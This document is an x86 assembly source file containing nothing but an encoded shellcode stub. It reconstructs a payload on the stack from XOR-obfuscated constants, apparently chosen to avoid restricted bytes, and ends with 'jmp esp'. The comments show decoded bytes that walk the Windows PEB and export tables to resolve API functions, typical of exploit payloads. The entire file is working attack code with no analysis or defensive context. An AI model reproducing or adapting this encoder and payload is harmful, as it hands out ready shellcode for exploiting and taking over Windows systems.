section .text

global _start
_start:
    pushad
register:
    push 0x21
    pop eax
    xor al , 0x21
    dec eax
    push eax
    xor al, 0x2f
    push eax
    pop esi
    pop ecx
    push esp
    pop ebx
encode:
; push 0x9090585a
    push 0x56243c66
    pop eax
    xor eax, 0x394b643c
    push eax
    xor [esp + esi + 0x32], cx
; push 0x585ac361
    push 0x677e4f3d
    pop eax
    xor eax, 0x3f24735c
    push eax
    xor [esp + esi + 0x31], ch
; push 0xe38b9d61
    push ecx
    pop eax
    xor eax, 0x5e3f503e
    xor eax, 0x424b325f
    push eax
    xor [esp + esi + 0x30], ch
; push 0xd2ff500a
    push 0x45523463
    pop eax
    xor eax, 0x68526469
    push eax
    xor [esp + esi + 0x32], cx
; push 0x6ae08921
    push 0x5a633156
    pop eax
    xor eax, 0x307c4777
    push eax
    xor [esp + esi + 0x31], cx
; push 0x21212124
    push 0x45494244
    pop eax
    xor eax, 0x64686360
    push eax
; push 0x2c81848d
    push ecx
    pop eax
    xor eax, 0x7251523c
    xor eax, 0x5e2f294e
    push eax
    xor [esp + esi + 0x33], ch
; push 0x82846821
    push 0x4359386e
    pop eax
    xor eax, 0x3e22504f
    push eax
    xor [esp + esi + 0x32], cx
; push 0x21212124
    push 0x7944596b
    pop eax
    xor eax, 0x5865784f
    push eax
; push 0x2c812121
    push 0x752c6d6e
    pop eax
    xor eax, 0x59524c4f
    push eax
    xor [esp + esi + 0x32], ch
; push 0x212168da
    push 0x6d443c57
    pop eax
    xor eax, 0x4c655472
    push eax
    xor [esp + esi + 0x30], ch
; push 0x0188148b
    push 0x585d7050
    pop eax
    xor eax, 0x592a6424
    push eax
    xor [esp + esi + 0x30], ch
    xor [esp + esi + 0x32], ch
; push 0x4a0c8b66
    push 0x29373e2b
    pop eax
    xor eax, 0x633b4a4d
    push eax
    xor [esp + esi + 0x31], ch
; push 0x585ae075
    push 0x64677436
    pop eax
    xor eax, 0x3c3d6b43
    push eax
    xor [esp + esi + 0x31], ch
; push 0x3c3e6889
    push 0x6f633055
    pop eax
    xor eax, 0x535d5823
    push eax
    xor [esp + esi + 0x30], ch
; push 0xfa81f4eb
    push ecx
    pop eax
    xor eax, 0x614b4a6a
    xor eax, 0x6435417e
    push eax
; push 0xc20111ca
    push ecx
    pop eax
    xor eax, 0x47355b67
    xor eax, 0x7a344a52
    push eax
    xor [esp + esi + 0x31], cx
; push 0xc10774c0
    push ecx
    pop eax
    xor eax, 0x7a5b5d75
    xor eax, 0x445c294a
    push eax
    xor [esp + esi + 0x31], cx
; push 0x84acd231
    push ecx
    pop eax
    xor eax, 0x4f68516b
    xor eax, 0x343b7c5a
    push eax
    xor [esp + esi + 0x30], ch
; push 0xc031de01
    push 0x72606e59
    pop eax
    xor eax, 0x4d514f58
    push eax
    xor [esp + esi + 0x31], ch
    xor [esp + esi + 0x33], ch
; push 0x8f348b49
    push 0x4b4a212e
    pop eax
    xor eax, 0x3b7e5567
    push eax
    xor [esp + esi + 0x31], ch
    xor [esp + esi + 0x33], ch
; push 0x4be352da
    push 0x325c3851
    pop eax
    xor eax, 0x79406a74
    push eax
    xor [esp + esi + 0x30], ch
    xor [esp + esi + 0x32], ch
; push 0x0124528b
    push 0x2e6d3731
    pop eax
    xor eax, 0x2f496545
    push eax
    xor [esp + esi + 0x30], ch
; push 0xdf01207a
    push 0x4b306428
    pop eax
    xor eax, 0x6b314452
    push eax
    xor [esp + esi + 0x33], ch
; push 0x8b50d801
    push 0x5d777c65
    pop eax
    xor eax, 0x29275b64
    push eax
    xor [esp + esi + 0x31], ch
    xor [esp + esi + 0x33], ch
; push 0x1c428b14
    push 0x22292b35
    pop eax
    xor eax, 0x3e6b5f21
    push eax
    xor [esp + esi + 0x31], ch
; push 0x4a8bda01
    push 0x62587b79
    pop eax
    xor eax, 0x282c5e78
    push eax
    xor [esp + esi + 0x31], cx
; push 0x781a548b
    push 0x4f642146
    pop eax
    xor eax, 0x377e7532
    push eax
    xor [esp + esi + 0x30], ch
; push 0x3c538b10
    push 0x623e2739
    pop eax
    xor eax, 0x5e6d5329
    push eax
    xor [esp + esi + 0x31], ch
; push 0x5b8b1b8b
    push 0x7c503945
    pop eax
    xor eax, 0x27242231
    push eax
    xor [esp + esi + 0x30], ch
    xor [esp + esi + 0x32], ch
; push 0x1b8b145b
    push 0x7d345e3e
    pop eax
    xor eax, 0x66404a65
    push eax
    xor [esp + esi + 0x32], ch
; push 0x8b0c5b8b
    push ecx
    pop eax
    xor eax, 0x36466f3d
    xor eax, 0x424a3449
    push eax
    xor [esp + esi + 0x31], cx
; push 0x305b8b64
    push 0x626e5336
    pop eax
    xor eax, 0x52352752
    push eax
    xor [esp + esi + 0x31], ch
; push 0xdb319c60
    push 0x41652e25
    pop eax
    xor eax, 0x65544d45
    push eax
    xor [esp + esi + 0x31], ch
    xor [esp + esi + 0x33], ch
; jmp to shellcode
to_shellcode:
    jmp esp
